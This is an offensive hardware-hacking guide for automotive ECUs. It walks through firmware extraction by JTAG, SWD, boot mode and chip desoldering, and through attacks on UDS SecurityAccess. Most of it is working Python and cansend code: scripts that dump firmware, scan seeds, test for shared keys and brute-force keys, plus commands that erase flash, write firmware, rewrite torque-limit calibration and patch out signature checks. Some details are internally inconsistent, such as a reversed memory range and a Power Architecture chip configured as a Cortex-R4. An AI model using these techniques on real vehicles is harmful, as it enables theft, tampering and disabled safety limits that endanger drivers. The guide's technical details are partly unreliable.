# Automotive ECU Firmware & UDS Diagnostics — Deep Dive

> Companion to `skills/automotive-vehicle-security/SKILL.md`.
>
> Audience: red teamers and security engineers who have a salvaged ECU on the bench, an established CAN bus pivot, and want to take an ECU from "I can inject frames" to "I have the firmware, the seed/key algorithm, and code execution on the microcontroller." This guide focuses on the firmware extraction path and the UDS service matrix that protects it.
>
> Scope: This is destructive, slow, hardware-intensive work. Many of the techniques require opening the ECU, desoldering flash, or attaching JTAG probes. None of it is a 30-minute exercise. The reward is the seed/key algorithm — once you have that, every ECU of the same family on the same platform falls.

---

## Introduction

A modern ECU is a small Linux-class computer on a deterministic real-time bus. The microcontroller is typically a Power Architecture (NXP MPC56xx/MPC57xx), a Renesas RH850 (V850 family), or an ARM Cortex-R (R5/R7). Each runs a fixed-function firmware image that has been compiled for the specific platform, signed by the OEM, and stored in internal flash. The image is read-protected by the SoC's secure boot. To get at the firmware, you need to bypass one of three layers:

1. The microcontroller's read protection (JTAG/SWD/NEXUS fuses, boot mode straps)
2. The SoC's secure boot (signature verification on power-up)
3. The UDS service layer (0x27 SecurityAccess protecting 0x34/0x36 firmware download)

The UDS layer is the easiest: it is the path the OEM's own tooling uses to flash new firmware at the dealer. If you can break 0x27, you can ask the ECU to dump its own firmware via 0x34/0x36 — no hardware work required. This guide walks all three paths, in order of increasing cost.

The 2015 Jeep Cherokee kill chain (Miller & Valasek) stopped at the CAN injection layer. The 2017 Tesla Keen Lab work went one layer deeper — they extracted firmware from ECUs to recover the SecOC keys. The 2023 UK CAN injection thefts used pre-built tools that perform UDS 0x27 attacks against specific OEM seed/key algorithms. The path from "physical OBD-II access" to "arbitrary ECU compromise" runs straight through this guide.

---

## ECU Architecture Overview

### Microcontroller Families

The automotive microcontroller market is dominated by three families:

**NXP MPC5xxx / MPC57xx (Power Architecture)** — the workhorse of safety-critical ECUs (engine, transmission, brake) from 2005-2020. Examples: MPC5644A (engine ECM), MPC5777C (gateway ECU), MPC5748G (body controller). Power Architecture (e200 core), 2-4 MB internal flash, no external memory bus on most variants. Has a BOOTS strap that forces serial boot mode on power-on. Debug via JTAG (Nexus class 3) or Aurora (high-speed trace). Read protection via a "shadow" flash address; if set, the JTAG/Aurora interfaces refuse reads.

**Renesas RH850 / V850 (RH850 family)** — the alternative workhorse. Popular in Japanese and Korean OEMs (Toyota, Honda, Hyundai-Kia, Nissan). RH850/E2x series for body, RH850/F1x for powertrain. Renesas has its own debug interface (E1/E20/Lauterbach), its own secure-boot scheme (CSIv2 — Cryptographic Security Integration), and a notoriously complex 0x27 seed/key family. Read protection via a fuse in the user-boot-area.

**ARM Cortex-R4/R5/R7** — increasingly common in newer platforms (ADAS ECUs, infotainment, some body controllers). NXP S32, Infineon AURIX (TriCore, not ARM but similar conceptually), TI TDA, Renesas R-Car all use ARM or ARM-compatible cores. Standard ARM SWD/JTAG debug; standard ARM secure boot. Easier to debug than Power Architecture because the tooling is more accessible.

### Memory Map (typical MPC57xx)

A typical ECU memory map looks like:

```
0x0000_0000 - 0x003F_FFFF   Internal flash (boot block, 256 KB)
                              - Secure boot code
                              - Start-up / init
                              - Shadow flash (read protect bits)
0x0040_0000 - 0x003F_FFFF   Internal flash (application code)
                              - UDS service dispatcher
                              - Calibration tables
                              - Application firmware
0x4000_0000 - 0x4000_FFFF   Internal SRAM (64 KB)
                              - Stack, heap, runtime data
0xC3F0_0000 - 0xC3F0_7FFF   Calibration RAM (mirror of flash)
                              - Live-tunable parameters
```

The "shadow flash" at 0x0000_0000 controls read protection. Setting the appropriate bit disables JTAG reads. Most production ECUs have it set. Boot mode (BOOTS strap low) bypasses the shadow flash check and forces the SoC to load from the serial debug interface instead.

### Firmware Update Architecture

Modern ECUs use one of three firmware update paths:

1. **A/B banking** — two flash banks; the new image is written to bank B while bank A is still running. If the new image fails to validate, the bootloader reverts to bank A. Most modern ECUs (R155 SUMS expectation).

2. **In-place with rollback** — single bank; the new image is written in place. The bootloader keeps the old signature; if the new image fails, the bootloader refuses to start and the ECU is bricked (OEM recall required). Older designs; not acceptable under R156.

3. **External EEPROM + flash copy** — the new image is downloaded to external EEPROM, then copied to internal flash on next boot. Slow but reliable. Common on body controllers.

The bootloader itself is a small piece of code that runs on every power-up. Its jobs: (1) verify the application's signature, (2) update from external EEPROM if a new image is queued, (3) enter UDS programming mode if requested. The bootloader is itself signed and is the root of trust — if you can compromise the bootloader, you own the ECU permanently.

---

## Firmware Extraction Methods

### Method 1: Boot Mode (Serial Boot)

Boot mode is the ECU's own recovery path. By strapping a pin low at power-on, you force the SoC to enter a serial boot mode that accepts commands from an external debugger. The ECU will read/write internal flash on demand.

**MPC56xx / MPC57xx boot mode:**

```
Pin:        BOOTS (varies by package; check the datasheet)
Active:     Low (tied to GND at power-on)
Recovery:   Once the strap is detected, the SoC enters boot mode
            within the first clock cycle and waits for serial commands
            on the JTAG / NEXUS pins.

Required:   P&E Micro Universal Multilink ($1000), Lauterbach Trace32 ($15k),
            or iSYSTEM iC5500 ($10k). Open-source: OpenBLT for some
            platforms (limited to ECUs that ship with OpenBLT bootloader).
```

The boot-mode sequence:

```bash
# P&E Micro Universal Multilink command line (Ubuntu Linux via Wine or Windows):
# 1. Power-cycle the ECU with BOOTS held low
# 2. Connect the Multilink to the JTAG header (TCK, TMS, TDI, TDO, RESET, VCC, GND)
# 3. Read flash:
uml_pe_micro_read_flash --device=MPC5748G --start=0x00400000 --length=0x00400000 --out=ecu_firmware.bin

# Lauterbach Trace32 (the industry-standard debugger for Power Architecture):
# t32power -c config_mpc5748g.t32
# In the Trace32 console:
#   SYStem.CPU MPC5748G
#   SYStem.Mode Attach
#   Data.LOAD.ABS ecu_app.elf   ; load symbols if available
#   Data.SAVE.BINARY ecu_flash.bin 0x00400000--0x007FFFFF

# OpenBLT bootloader (if the ECU uses OpenBLT):
# https://feaser.com/openblt/
# Flash via the OpenBLT host tool:
./bootcommander -t=xcp_v10 -d=can0 -t1=0x7E0 -t2=0x7E8 flash ecu_firmware.srec
```

**Renesas RH850 boot mode:**

```bash
# Renesas uses its own E1/E20 debuggers, or Lauterbach
# The RH850 has a "CSI" (Crypto Service Integration) that protects boot mode
# with a challenge-response. You need the OEM's CSI key to unlock.
# Open-source RH850 tools are limited; the Renesas E1 starter kit is ~$200

# Once unlocked:
# Renesas CS+ debugger:
#   Connect → Read Flash → Save as .hex
```

**ARM Cortex-R boot mode:**

```bash
# ARM SoCs use SWD (Serial Wire Debug) or JTAG. OpenOCD is the standard tool.
# 1. Identify the SWD pins (SWCLK, SWDIO, RESET, VCC, GND) on the ECU board
# 2. Connect an ST-Link v2 ($15 clone), J-Link EDU ($300), or Black Magic Probe ($100)
# 3. OpenOCD config:
cat > openocd_ecu.cfg <<'EOF'
source [find interface/stlink.cfg]
transport select hla_swd
source [find target/stm32f4x.cfg]   ; adjust for the target SoC
reset_config srst_only srst_nogate
EOF

# 4. Read flash:
openocd -f openocd_ecu.cfg -c "init" -c "reset halt" -c "flash read_bank 0 ecu_flash.bin 0 0x400000" -c "shutdown"

# 5. If read protection is set (STM32 RDP Level 2), mass-erase is the only option
#    (destructive — wipes the firmware). Set RDP Level 1 to allow reads with a
#    partial wipe. Set RDP Level 0 (default on dev parts) for full read access.
```

### Method 2: JTAG Direct Read

JTAG reads work even when boot mode is locked, IF the read protection is not fused. The technique is identical to method 1, except you skip the boot strap and just attach the debugger while the ECU is running.

```bash
# OpenOCD JTAG attach to a running MPC57xx:
cat > openocd_jtag.cfg <<'EOF'
interface jlink
transport select jtag
jtag_khz 1000
set _CHIPNAME mpc5748g
jtag newtap $_CHIPNAME cpu -irlen 6 -expected-id 0x4BA00477
target create $_CHIPNAME.cpu cortex_r4 -chain-position $_CHIPNAME.cpu
EOF

openocd -f openocd_jtag.cfg -c "init" -c "halt" -c "mpc5748g mdw 0x00400000 0x4000" -c "shutdown"
# If this returns all 0x00 or all 0xFF, read protection is fused — try boot mode
# or NAND desoldering (Method 4).
```

### Method 3: NAND / eMMC Desoldering

Destructive, irreversible, voids the warranty — but it works even when all read protection is fused. The technique is to physically remove the flash chip and read it with an external programmer.

**Tools required:**

| Tool | Cost | Purpose |
|------|------|---------|
| Hot-air rework station (e.g., Quick 861DW) | ~$150 | Desolder the flash chip |
| TSOP-48 socket (for NAND) | ~$20 | Read TSOP-48 NAND chips |
| BGA-153 socket (for eMMC) | ~$80 | Read BGA eMMC chips |
| Xeltek SuperPro 7500 | ~$3000 | Universal flash programmer |
| RT809F programmer | ~$200 | Cheaper alternative for SPI/eMMC |
| CH341A-based SPI programmer | ~$15 | Cheapest, SPI flash only |
| Software: flashrom (Linux) | Free | Reads SPI flash via CH341A |

**SPI NOR flash (smaller, simpler ECUs):**

```bash
# Many body controllers use SPI NOR (Winbond W25Q128, Macronix MX25L6406)
# Chip is in an SOIC-8 package — easy to desolder with a hot-air station
# Read with a CH341A-based programmer (~$15):
sudo apt-get install flashrom
# Clip the SOIC-8 chip into the CH341A socket
sudo flashrom -p ch341a_spi -r ecu_spi_flash.bin
# Output: ecu_spi_flash.bin (1-16 MB depending on chip)
# Verify:
sudo flashrom -p ch341a_spi -v ecu_spi_flash.bin

# Or read in-circuit (no desoldering) using a Pomona SOIC-8 test clip:
sudo flashrom -p ch341a_spi -r ecu_spi_flash.bin --layout layout.txt
# (In-circuit reads can fail if other components on the bus interfere)
```

**eMMC (larger, modern ECUs — infotainment, ADAS):**

```bash
# Modern ECUs use eMMC (BGA-153). Typical sizes: 4 GB - 64 GB.
# Desolder with hot-air + BGA rework station, place in an eMMC socket reader
# Reads as a standard block device:
sudo dd if=/dev/sdb of=ecu_emmc.bin bs=4M status=progress
sudo dd if=/dev/sdb of=ecu_emmc.bin bs=4M conv=fsync,noerror,sync
# Verify:
sha256sum /dev/sdb ecu_emmc.bin
# (Should match — if not, the read was unreliable)

# Mount and inspect partitions:
sudo losetup -P -f --show ecu_emmc.bin
# /dev/loop0p1, p2, p3, ...
sudo mount /dev/loop0p2 /mnt/ecu_root
ls /mnt/ecu_root
# Typical layout:
#   /boot      - Linux kernel
#   /lib/firmware - OEM firmware
#   /etc/systemd/system - services
#   /opt/oem  - proprietary application
```

### Method 4: OTA Package Parsing

The OEM's OTA update package IS the firmware. If you can capture the OTA package (via MitM on the IVI's HTTPS connection, via the OEM's developer portal, or via a leaked build), you have the firmware without ever touching the ECU.

```bash
# Most OEMs deliver updates as a signed ZIP / tarball
# Extract:
unzip -l oem_ota_package.zip
unzip oem_ota_package.zip -d ota_extracted/

# Inspect the manifest:
cat ota_extracted/META-INF/com/android/metadata
# Typical fields: build_target, build_timestamp, post-build-incremental

# Look for individual ECU images:
ls ota_extracted/images/
#   engine_ecu.bin   transmission_ecu.bin   abs_ecu.bin   ...

# Inspect the updater script:
cat ota_extracted/META-INF/com/google/android/update-binary
# This is the script the OTA system runs to flash each ECU

# Check the signature (most OEMs use PKCS#7 over the manifest):
openssl pkcs7 -inform DER -in ota_extracted/META-INF/com/android/ota_signature -print_certs
# Compare the cert against the OEM's published root
```

### Method 5: ISP (In-System Programming) via UDS

If you have broken 0x27 SecurityAccess (see the UDS section below), you can ask the ECU to dump its own firmware via UDS 0x34 (RequestDownload) / 0x36 (TransferData) / 0x37 (RequestTransferExit). This is the cleanest path because the ECU does the work for you — no hardware modification.

```python
#!/usr/bin/env python3
# uds_dump_firmware.py — dump ECU firmware via UDS 0x34/0x36/0x37
# Requires: 0x27 SecurityAccess already unlocked in programming session
import can, struct, time

bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000)
TARGET = 0x7E0
RESPONSE = 0x7E8

def isotp_send(arb_id, payload):
    """Send a single-frame ISO-TP message."""
    if len(payload) <= 7:
        # Single frame: PCI byte = 0x0<length>
        data = bytes([len(payload) & 0x0F]) + payload + b'\x00' * (7 - len(payload))
        msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
        bus.send(msg)
    else:
        # Multi-frame: FirstFrame + ConsecutiveFrames + flow control
        # (full ISO-TP stack omitted for brevity; use python-can's isotp package)
        raise NotImplementedError("Use python-isotp for multi-frame")

def isotp_recv(timeout=2.0):
    """Receive and reassemble an ISO-TP message."""
    msg = bus.recv(timeout=timeout)
    if msg is None or msg.arbitration_id != RESPONSE:
        return None
    pci = msg.data[0]
    if (pci & 0xF0) == 0x00:
        # Single frame
        return msg.data[1:1 + (pci & 0x0F)]
    elif (pci & 0xF0) == 0x10:
        # First frame — multi-frame response
        total_len = ((pci & 0x0F) << 8) | msg.data[1]
        # Send flow control: 30 00 00 (continue, no delay)
        fc = can.Message(arbitration_id=TARGET, data=bytes([0x30, 0x00, 0x00]) + b'\x00' * 5)
        bus.send(fc)
        result = bytearray(msg.data[2:])
        expected_sn = 1
        while len(result) < total_len:
            cf = bus.recv(timeout=timeout)
            if cf is None or cf.arbitration_id != RESPONSE:
                return None
            sn = cf.data[0] & 0x0F
            if sn != expected_sn % 16:
                print(f"Sequence error: expected {expected_sn % 16}, got {sn}")
                return None
            result.extend(cf.data[1:1 + min(7, total_len - len(result))])
            expected_sn += 1
        return bytes(result[:total_len])
    return None

# 1. Open programming session (requires 0x27 unlock first)
isotp_send(TARGET, bytes([0x10, 0x02]))  # 0x10 DiagnosticSessionControl, 0x02 programming
print(f"Session: {isotp_recv().hex()}")

# 2. RequestDownload: 0x34 service, dataFormatIdentifier=0x00 (raw),
#    addressAndLengthFormatIdentifier=0x44 (4-byte addr, 4-byte length)
flash_start = 0x00400000
flash_length = 0x00200000  # 2 MB

# Build the 0x34 request
data_format = 0x00
addr_len_fmt = 0x44
request = bytes([0x34, data_format, addr_len_fmt])
request += struct.pack('>I', flash_length)
request += struct.pack('>I', flash_start)
isotp_send(TARGET, request)
resp = isotp_recv()
print(f"RequestDownload response: {resp.hex() if resp else 'None'}")
# Positive: 0x74 <block_length_format> <block_length>
# block_length is how many bytes per 0x36 TransferData request
block_size = 0x100  # typical: 256 bytes per block

# 3. TransferData: 0x36 with block sequence counter starting at 1
firmware = bytearray()
block_counter = 1
address = flash_start
while address < flash_start + flash_length:
    isotp_send(TARGET, bytes([0x36, block_counter & 0xFF]))
    resp = isotp_recv(timeout=5.0)
    if resp is None:
        print(f"No response at block {block_counter}")
        break
    if resp[0] != 0x76:
        print(f"Negative response at block {block_counter}: {resp.hex()}")
        break
    firmware.extend(resp[1:])
    address += len(resp) - 1
    block_counter += 1
    if block_counter % 100 == 0:
        print(f"Progress: {address - flash_start} / {flash_length} bytes ({100 * (address - flash_start) // flash_length}%)")

# 4. RequestTransferExit: 0x37
isotp_send(TARGET, bytes([0x37]))
resp = isotp_recv()
print(f"TransferExit response: {resp.hex() if resp else 'None'}")

# 5. Save the firmware
with open('ecu_firmware_via_uds.bin', 'wb') as f:
    f.write(firmware)
print(f"Saved {len(firmware)} bytes to ecu_firmware_via_uds.bin")
```

### Method 6: Side-Channel via Power Analysis

For ECUs where the above methods fail, side-channel analysis (power, EM, glitch) can recover keys. See the `hardware-security` skill for the technique. The specific automotive applications:

- **DPA on HSM crypto** — differential power analysis on the HSM's MAC computation can recover the SecOC key in ~10k power traces.
- **Glitch attack on secure boot** — voltage or clock glitching during the signature verification can skip the verification step, allowing unsigned firmware to boot.
- **EM probe on flash read** — an EM probe on the SoC can read out flash contents through the silicon (laser-decapped parts only).

These are advanced techniques requiring ~$10k-$100k of equipment (ChipWhisperer for DPA, GlasGlow for glitching, Riscure EM probe stations). See `skills/hardware-security/` for details.

---

## UDS Service Deep Dive

UDS (Unified Diagnostic Services, ISO 14229-1) is the application-layer diagnostic protocol. It runs over CAN (DoCAN, ISO 15765-3), K-Line (KWP2000, ISO 14230), FlexRay (DoFR), or Automotive Ethernet (DoIP, ISO 13400). The service IDs are 0x10-0x3E; each service has one or more sub-functions.

### Full Service Table (0x10-0x3E)

| SID  | Service | Sub-functions | Security? | Notes |
|------|---------|---------------|-----------|-------|
| 0x10 | DiagnosticSessionControl | 0x01 default, 0x02 programming, 0x03 extended | None | First step in any UDS attack |
| 0x11 | ECUReset | 0x01 hard, 0x02 key off, 0x03 soft, 0x04 enable rapid power shutdown | None | DoS vector; careful |
| 0x14 | ClearDiagnosticInformation | (none, group of DTCs) | Default | Clears DTCs |
| 0x19 | ReadDTCInformation | 0x02 by status mask, 0x0A all | None | Read stored fault codes |
| 0x22 | ReadDataByIdentifier | (DID in request) | None | Read VIN, serial, boot SW |
| 0x23 | ReadMemoryByAddress | (address+length in request) | **0x27** | HIGH value — direct memory read |
| 0x24 | ReadScalingDataByIdentifier | (DID in request) | None | Read scaling info |
| 0x27 | SecurityAccess | 0x01 requestSeed, 0x02 sendKey, 0x03/0x04 etc | **THE GATE** | The service this section is about |
| 0x28 | CommunicationControl | 0x00/0x01/0x02/0x03 enable/disable Rx/Tx | None | Suppress normal CAN traffic |
| 0x2E | WriteDataByIdentifier | (DID in request) | **0x27** | Write to NVM |
| 0x2F | InputOutputControlByIdentifier | (DID in request) | **0x27** | Force signal values (PoC) |
| 0x31 | RoutineControl | 0x01 start, 0x02 stop, 0x03 requestResult | **0x27** | Run ECU routines (erase flash, etc.) |
| 0x34 | RequestDownload | (address+length) | **0x27** | Flash write — pre-step |
| 0x35 | RequestUpload | (address+length) | **0x27** | Flash read |
| 0x36 | TransferData | (block counter) | **0x27** | Flash write/read blocks |
| 0x37 | RequestTransferExit | (none) | **0x27** | End transfer |
| 0x38 | RequestFileTransfer | (file path) | **0x27** | Modern alternative to 0x34/0x36 |
| 0x3D | WriteMemoryByAddress | (address+data) | **0x27** | Direct memory write |
| 0x3E | TesterPresent | 0x00 no response, 0x80 with response | None | Keep-alive |

### Security Access (0x27) — Seed-Key Deep Dive

The 0x27 SecurityAccess service is the gate. It implements a challenge-response protocol:

1. Tester sends `0x27 <subfunc>` where subfunc is odd (0x01, 0x03, 0x05, ...). The ECU returns a "seed" — a random or pseudo-random value.
2. Tester computes the "key" from the seed using a secret algorithm.
3. Tester sends `0x27 <subfunc+1>` (0x02, 0x04, 0x06, ...) with the computed key.
4. The ECU verifies the key. If correct, the corresponding privilege is unlocked.

The seed-key algorithm is OEM- and ECU-specific. Common patterns:

- **Linear LFSR** — a linear-feedback shift register seeded with the seed; the key is the LFSR output after N steps. Trivially reversible.
- **XOR with fixed key** — `key = seed XOR 0x12345678`. Trivially reversible.
- **GM "GM_H"** — a specific seed-key algorithm used by GM and some Tier-1s. Documented in multiple public databases.
- **Cryptographic (HMAC, AES)** — modern ECUs use HMAC-SHA256 with a per-ECU key. Not reversible without the key.

**Seed capture (requesting a seed):**

```bash
# In the UDS enumeration phase, request a seed from each ECU:
cansend can0 7E0#0227010000000000
#           ^^ ^^ ^^
#           ID  SVC SUBFUNC (0x01 = requestSeed)
# Response on 0x7E8:
candump -L can0 -n 1
#   (1609487127.521379) can0 7E8#04670111223300
#                            ^^ ^^ ^^ ^^^^^^
#                            SF SVC SEED  2-byte seed (0x1122)
#                            04=SF len=4; 67=0x27+0x40 positive
```

**Seed-length scan across all ECUs:**

```python
#!/usr/bin/env python3
# seed_scan.py — scan all ECUs for seed length
import can

bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000)

for addr in range(0x7E0, 0x7E8):
    # Request seed on sub-function 0x01 (default session)
    req = can.Message(
        arbitration_id=addr,
        data=bytes([0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),
        is_extended_id=False
    )
    bus.send(req)
    resp = bus.recv(timeout=0.5)
    if resp is None:
        print(f"0x{addr:03X}: no response")
        continue
    if resp.data[0] & 0xF0 == 0x00:
        # Single frame
        length = resp.data[0] & 0x0F
        svc_byte = resp.data[1]
        if svc_byte == 0x67:
            seed = resp.data[3:3 + (length - 2)]
            print(f"0x{addr:03X}: seed={seed.hex()} ({len(seed)} bytes)")
        elif svc_byte == 0x7F:
            nrc = resp.data[3]
            print(f"0x{addr:03X}: rejected NRC=0x{nrc:02X}")
        else:
            print(f"0x{addr:03X}: unexpected response {resp.data.hex()}")
```

**Seed/key reuse detection (Tier-1 cross-ECU reuse):**

```python
#!/usr/bin/env python3
# seed_reuse_check.py — detect if multiple ECUs use the same seed/key algorithm
# Technique: request a seed from each ECU, then send the same key. If multiple
# ECUs accept it, they share the algorithm.
import can, time

bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000)

def request_seed(addr):
    req = can.Message(arbitration_id=addr, data=bytes([0x02, 0x27, 0x01, 0, 0, 0, 0, 0]))
    bus.send(req)
    resp = bus.recv(timeout=1.0)
    if resp and resp.data[1] == 0x67:
        return resp.data[3:3 + (resp.data[0] & 0x0F - 2)]
    return None

def send_key(addr, key_bytes):
    req = can.Message(
        arbitration_id=addr,
        data=bytes([0x02 + len(key_bytes), 0x27, 0x02]) + key_bytes + b'\x00' * (5 - len(key_bytes))
    )
    bus.send(req)
    resp = bus.recv(timeout=1.0)
    return resp and resp.data[1] == 0x67

# Open programming session on each ECU first (required for 0x27 in many ECUs)
for addr in range(0x7E0, 0x7E8):
    session_req = can.Message(arbitration_id=addr, data=bytes([0x02, 0x10, 0x02, 0, 0, 0, 0, 0]))
    bus.send(session_req)
    time.sleep(0.1)
    bus.recv(timeout=0.5)

# Request a seed from each ECU
seeds = {}
for addr in range(0x7E0, 0x7E8):
    seeds[addr] = request_seed(addr)

# Compute the "GM_H" key for one ECU's seed and try it on all
# (GM_H is a known weak algorithm — for demo only)
def gm_h_key(seed):
    """Simplified GM_H key derivation. Real GM_H is more complex."""
    return bytes([(b * 0x11 + 0x22) & 0xFF for b in seed])

if seeds[0x7E0]:
    key = gm_h_key(seeds[0x7E0])
    print(f"GM_H key for 0x7E0 seed {seeds[0x7E0].hex()}: {key.hex()}")
    for addr in range(0x7E0, 0x7E8):
        if send_key(addr, key):
            print(f"  0x{addr:03X}: KEY ACCEPTED — algorithm shared!")
        else:
            print(f"  0x{addr:03X}: key rejected (algorithm differs)")
```

**Brute-force on weak seed:**

```python
#!/usr/bin/env python3
# brute_seed_key.py — brute-force a weak (2-byte) seed/key
# Most production ECUs use 4-byte seeds; older ECUs use 2-byte.
# A 2-byte seed gives 65536 possible keys — brute-forceable in minutes
# at 10 ms per attempt, or seconds if you bypass the 0x37 (time delay) NRC.

import can, time, itertools

bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000)
TARGET = 0x7E0

# Note: most ECUs lock 0x27 after 3 failed attempts with a 10-second delay
# (NRC 0x37 = requiredTimeDelayNotExpired). To brute-force, you need to
# bypass this — usually by power-cycling the ECU between attempts.
# This script demonstrates the algorithm; the power-cycle step is hardware-specific.

def try_key(seed, candidate_key):
    """Try a single candidate key. Returns True if accepted."""
    req = can.Message(
        arbitration_id=TARGET,
        data=bytes([0x02 + len(candidate_key), 0x27, 0x02]) + candidate_key + b'\x00' * (5 - len(candidate_key))
    )
    bus.send(req)
    resp = bus.recv(timeout=1.0)
    return resp and resp.data[1] == 0x67

# Assume a 2-byte seed and 2-byte key with simple XOR derivation
# Real ECUs use 4-byte seeds and HMAC; this is for older designs only
print("Brute-forcing 2-byte key space (65536 combinations)...")
for key_int in range(0x10000):
    candidate = key_int.to_bytes(2, 'big')
    # For demo: assume key = seed XOR 0xABCD (real algorithm varies)
    # The real brute-force would compute candidate = f(seed) for various f
    if try_key(None, candidate):  # seed omitted; use last captured seed
        print(f"KEY FOUND: 0x{candidate.hex()}")
        break
    if key_int % 1000 == 0:
        print(f"  Progress: {key_int}/65536")
```

### Routine Control (0x31) — Erase Flash, Run Diagnostics

Once 0x27 is unlocked, 0x31 RoutineControl lets you invoke ECU routines. The most security-relevant routine is "Erase Flash" (typically Routine Identifier 0xFF00).

```bash
# 1. Open programming session (requires 0x27 unlock)
cansend can0 7E0#0210020000000000

# 2. Unlock SecurityAccess (skipped; see seed-key section)

# 3. StartRoutineByLocalIdentifier: erase flash (0xFF00)
#    Request: 0x31 0x01 <routine_id_hi> <routine_id_lo> <address_and_length>
cansend can0 7E0#0A31010000FF00000040
#            ^^ ^^ ^^ ^^^^^^ ^^^^^^^^^^
#            SF SVC SUB   ROUTINE  START_ADDR=0x00004000
#            0A=SF len=10

# 4. Wait for routine to complete (may take 10+ seconds for large flash blocks)
#    The ECU may respond with 0x21 (requestCorrectlyReceivedResponsePending)
#    repeatedly until done. Send TesterPresent every 5 seconds to keep the
#    session alive:
cansend can0 7E0#023E000000000000   # TesterPresent

# 5. Request routine result: 0x31 0x03
cansend can0 7E0#033103FF0000000000
# Response: 0x71 0x03 0xFF 0x00 0x00 (success)

# Common RoutineIdentifiers:
#   0xFF00  Erase Flash
#   0xFF01  Check Flash Empty
#   0xFF02  Validate Firmware Signature
#   0xFF03  Check Compatibility
#   0x0203  Erase Calibration (OEM-specific)
#   0x0204  Write Boot Block (OEM-specific)
```

### ECU Programming (0x34 / 0x36 / 0x37) — Firmware Update Attack

The 0x34/0x36/0x37 sequence is the OEM's official firmware update mechanism. If 0x27 is broken, an attacker can use these services to:

1. Read out the existing firmware (0x35 + 0x36)
2. Modify the firmware offline (e.g., patch out the speed limiter)
3. Erase flash (0x31 routine)
4. Write the modified firmware back (0x34 + 0x36)
5. Validate and exit (0x37)

```bash
# 1. RequestDownload: 0x34
#    Format: 0x34 <dataFormatId> <addrLenFormatId> <uncompressedSize> <memoryAddress>
#    addrLenFormatId: high nibble = length-of-length field, low nibble = length-of-address
#    Example: 0x44 = 4-byte length, 4-byte address
cansend can0 7E0#0A3400440002000000400000
#            ^^ ^^ ^^ ^^ ^^^^^^^^^^ ^^^^^^^^
#            SF SVC FMT ALF        ADDR=0x00400000
#            (size=0x00020000 = 128 KB)
# Response: 0x74 <blockLengthSize> <blockLength>
# blockLength tells you how many bytes per 0x36 request

# 2. TransferData: 0x36, with block sequence counter 1, 2, 3, ...
#    Each block is up to (blockLength - 2) bytes of firmware data
#    Block counter wraps at 0xF0 -> 0x00
# Example (sending a 256-byte block):
cansend can0 7E0#2236010102030405...   # truncated
# (In practice, use python-can or python-isotp; raw cansend is too verbose for 256-byte blocks)

# 3. After all blocks sent, RequestTransferExit: 0x37
cansend can0 7E0#0137000000000000
# Response: 0x77 (success)

# 4. The ECU validates the new firmware's signature. If valid, the new firmware
#    is committed to flash and runs on next power-up. If invalid, the ECU
#    reverts to the previous firmware (or bricks, depending on the bootloader).
```

### Firmware Update Attacks

Beyond the basic 0x34/0x36/0x37 sequence, attackers target the firmware update mechanism itself:

**Attack 1: Signature verification bypass.** If the ECU's signature verification has a flaw (e.g., accepts RSA with e=1, or accepts empty signatures, or doesn't check the certificate chain), an attacker can write unsigned firmware. Documented in several older Tier-1 bootloader implementations.

**Attack 2: Rollback attack.** If the ECU does not enforce a minimum firmware version, an attacker can flash an older, vulnerable firmware version. The older version may have known exploits. Mitigation: monotonically increasing version counter in secure storage.

**Attack 3: Bootloader compromise.** If the bootloader is in a writable region of flash, an attacker who has broken 0x27 once can write a malicious bootloader that disables future signature checks. Persistent compromise across firmware updates.

**Attack 4: JTAG fuse blow.** Some bootloaders have a "blow the JTAG fuse" routine that an attacker can invoke via 0x31 after breaking 0x27. This is normally an OEM factory step; if accessible, it locks the ECU permanently.

**Attack 5: Calibration write (0x2E) abuse.** Instead of writing new firmware, an attacker can write to calibration DIDs (0x2E WriteDataByIdentifier on calibration DIDs like 0xF150-F15F). This changes ECU behavior without changing firmware — e.g., removing the speed limiter, changing emissions maps, disabling fault detection.

```bash
# Example: write a calibration DID (requires 0x27 unlock)
# DID 0xF150 might be a torque limit table
cansend can0 7E0#2A2EF150FF00FF00FF00...
#            ^^ ^^ ^^^^^^ ^^^^^^^^^^^^^
#            SF SVC DID   DATA (new torque limits)
# Response: 0x6E (success) — calibration updated
# The new calibration takes effect immediately (no reboot needed)
```

### Secure Boot Bypass Attempts

Secure boot is the OEM's last line of defense: the bootloader verifies the application's signature before jumping to it. If secure boot is bypassed, the attacker can run arbitrary code on the ECU. Common bypass techniques:

**Bypass 1: Bootloader vulnerability.** The bootloader itself may have a buffer overflow in its image parser. A crafted firmware image triggers the overflow before signature verification completes, achieving code execution in the bootloader context. From there, the attacker can disable secure boot permanently.

**Bypass 2: Voltage glitching.** A precisely-timed voltage drop during the signature verification can cause the SoC to skip the verification instruction. Requires a ChipWhisperer or GlasGlow (~$1k-$5k). Documented against older MPC56xx secure boot implementations.

**Bypass 3: Clock glitching.** Similar to voltage glitching but targets the clock signal. The SoC's pipeline skips an instruction during the glitch window. Hardware-intensive; documented against ARM Cortex-R secure boot.

**Bypass 4: Boot ROM exploit.** Some SoCs have an immutable boot ROM that loads the bootloader. A vulnerability in the boot ROM (e.g., buffer overflow in the boot ROM's image parser) is unpatchable — it's burned into the silicon. Documented against several popular SoCs (see hardware-security skill).

**Bypass 5: Flash modification in spite of secure boot.** If secure boot only verifies the application on power-up, but the attacker has JTAG access during runtime, the attacker can modify flash contents in SRAM (where the application is mirrored) without triggering secure boot. The change is lost on power-up, but persists for the current session.

### Signature Verification Analysis

Once you have the firmware (via any extraction method), analyze the signature verification logic:

```bash
# 1. Open the firmware in Ghidra
ghidraRun
# File → Import → ecu_firmware.bin
# Language: PowerPC:BE:32:MPC555 (or RH850, or ARM Cortex-R)

# 2. Auto-analyze, then search for the signature verification code
#    Look for calls to RSA/ECDSA functions (typically from a crypto library
#    like mbedTLS, OpenSSL, or an OEM-internal lib)
#    Search strings: "RSA", "ECDSA", "SHA256", "verify", "signature"

# 3. Identify the verification result check
#    Typical pattern:
#      bl verify_signature     ; call verification
#      cmpwi cr0, r3, 0        ; check result
#      beq boot_ok             ; branch if zero (success)
#      bl infinite_loop        ; halt on failure
#    The "branch if zero" is the target for patching

# 4. Patch the firmware to always succeed
#    In Ghidra: right-click the branch instruction → Patch Instruction → "b boot_ok"
#    Export the patched firmware

